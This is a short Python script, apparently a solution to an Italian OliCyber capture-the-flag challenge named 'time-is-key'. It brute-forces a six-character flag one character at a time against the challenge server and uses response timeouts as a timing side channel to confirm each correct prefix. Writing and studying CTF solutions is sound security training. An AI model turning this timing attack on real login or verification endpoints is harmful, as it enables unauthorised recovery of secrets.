import requests

charset = "abcdefghijklmnopqrstuvwxyz0123456789"

strr = ['a'] * 6
idx = 0
data = {
    "flag": "",
    "submit": "Invia+la+flag!"
}

while idx < 6:
    try:
        for j in charset:
                strr[idx] = j
                res = ''.join(strr)
                data["flag"] = res
                print(res)

                response = requests.post('http://time-is-key.challs.olicyber.it/', data=data, timeout=(idx + 1) - 0.1)

        print("Qualcosa è andato storto ❌")
    except requests.exceptions.Timeout:
        print("✅: ", ''.join(strr[:idx + 1]))
        idx += 1



